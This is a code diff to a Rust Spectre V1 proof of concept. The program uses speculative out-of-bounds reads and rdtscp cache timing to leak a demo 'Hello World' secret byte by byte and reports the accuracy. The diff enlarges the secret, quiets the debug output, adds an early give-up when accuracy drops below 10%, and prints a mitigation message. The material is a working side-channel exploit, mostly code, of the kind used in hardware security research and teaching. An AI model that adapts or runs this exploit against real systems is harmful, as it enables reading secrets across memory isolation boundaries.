@@ -11,6 +11,7 @@
 use std::arch::asm;
 use std::arch::x86_64::*;
 use rand::Rng;
+use std::process;
 use std::io;
 use std::io::Write;
 
@@ -53,8 +54,8 @@ fn init_attack() -> (Vec<bool>, Vec<u8>) {
     // STRANGELY, the attack doesn't work if the next three lines are deleted, likely due
     // to its affect on the storage allocators ?!?!?!
     let mut rng = rand::thread_rng();
-    println!("is_attack = {:?}", is_attack);
-    println!("attack_pattern = {:?}", attack_pattern);
+    // println!("is_attack = {:?}", is_attack);
+    // println!("attack_pattern = {:?}", attack_pattern);
 
     (is_attack, attack_pattern)
 }
@@ -206,22 +207,27 @@ fn main() {
 
     // let mut arr1: [u8; 16] = [17, 8, 24, 14, 3, 28, 6, 19, 9, 25, 11, 30, 5, 20, 16, 2];
     let mut arr1 = vec! [17u8, 8, 24, 14, 3, 28, 6, 19, 9, 25, 11, 30, 5, 20, 16, 2];
-    let mut secret: [u8; 20] = [72, 101, 108, 108, 111, 32, 87, 111, 114, 108, 100, 32, 72, 101, 108, 108, 111, 32, 32, 32];
+    // let mut rng = rand::thread_rng();
+    // arr1.resize(arr1.len() + (rng.gen::<usize>() % 512), 0);
+    // let mut secret: [u8; 20] = [72, 101, 108, 108, 111, 32, 87, 111, 114, 108, 100, 32, 72, 101, 108, 108, 111, 32, 32, 32];
+    let mut secret: [u8; 60] = [73, 101, 108, 108, 111, 32, 87, 111, 114, 108, 100, 32, 72, 101, 108, 108, 111, 32, 32, 32, 72, 101, 108, 108, 111, 32, 87, 111, 114, 108, 100, 32, 72, 101, 108, 108, 111, 32, 32, 32, 72, 101, 108, 108, 111, 32, 87, 111, 114, 108, 100, 32, 72, 101, 108, 108, 111, 32, 32, 32 ];
+    let secret_start:usize = 0;
 
     let count1 = rdtscp();
     let count2 = rdtscp();
-    println!("The timer values are {} and {} (diff = {})", count1, count2, count2-count1);
+    // println!("The timer values are {} and {} (diff = {})", count1, count2, count2-count1);
 
     // This is where you would set up shared memory for arr1 and arr2, as in the C++ code.
     // You'll need to replace these placeholders with actual memory setup.
-    let mut arr2: [u8; 256 * 512] = [0; 256 * 512]; // Placeholder, initialize with appropriate values
     let mut results: [u32; 256] = [0; 256];
+    let mut arr2: [u8; 256 * 512] = [0; 256 * 512]; // Placeholder, initialize with appropriate values
     let mut target_idx: usize;
 
     unsafe {
         target_idx = (secret.as_ptr().offset_from(arr1.as_ptr())) as usize; /* Its value is the difference in the address of SECRET KEY and arr1*/
         println!("Distance to secret array = {} ({:#02x} -> {:#02x})", target_idx, arr1.as_ptr() as usize, secret.as_ptr() as usize);
     }
+    target_idx += secret_start;
 
     // The init function will initialize the IS_ATTACK and ATTACK_PATTERN
     let (is_attack, attack_pattern) = init_attack();
@@ -239,11 +245,14 @@ fn main() {
     let mut correct_letters: usize = 0;
     let mut total_letters: usize = 0;
 
-    for _ in 0..20 {
+    println!("Running Spectre V1 attack tests...");
+   
+    let mut sum: u8 = 0;
+    let mut finished = true;
+    for _ in 0..5 {
       // println!("Reading {} bytes from target ::", arr1.len());
       let mut guessed_secret = String::new(); // This will store the most-likely value of the SECRET_KEY overall
-      let mut sum: u8 = 0;
-      for i in 0..secret.len() {
+      for i in 0..secret.len()-secret_start {
           // println!("Reading at Target Address = {}", target_idx + i);
   
           sum = read_memory_byte(target_idx + i, &is_attack, &arr1, &mut arr1_len, &mut arr2, &attack_pattern, &mut results, attack_pattern[0] as usize) - sum;
@@ -266,7 +275,7 @@ fn main() {
           guessed_secret.push(most_likely_char as char);
       }
 
-      println!("Guessed secret = {}", guessed_secret);
+      println!("Guessed secret = `{}'", guessed_secret);
 
       total_letters += guessed_secret.len();
       for i in 0..guessed_secret.len() {
@@ -275,8 +284,25 @@ fn main() {
           correct_letters += 1;
         }
       }
+
+      // give up as soon as success rate drops below 10%
+      if (correct_letters as f64)/(total_letters as f64) < 0.10
+      {
+          finished = false;
+          break;
+      }
     }
 
-    println!("Final stats: {}% correct guesses. ({} out of {} letters).", (correct_letters as f64)/(total_letters as f64)*100.0, correct_letters, total_letters);
+    if finished
+    {
+        println!("Final stats: {}% correct guesses. ({} out of {} letters).", (correct_letters as f64)/(total_letters as f64)*100.0, correct_letters, total_letters);
+    }
+    else
+    {
+      println!("This target mitigates Spectre V1 or memory alignment does not permit the attack, rebuild and rerun to attempt again...");
+    }
+
+    println!("NOTE: Required to stop dead code removal: Sum: {}", sum);
+ 
 }
 
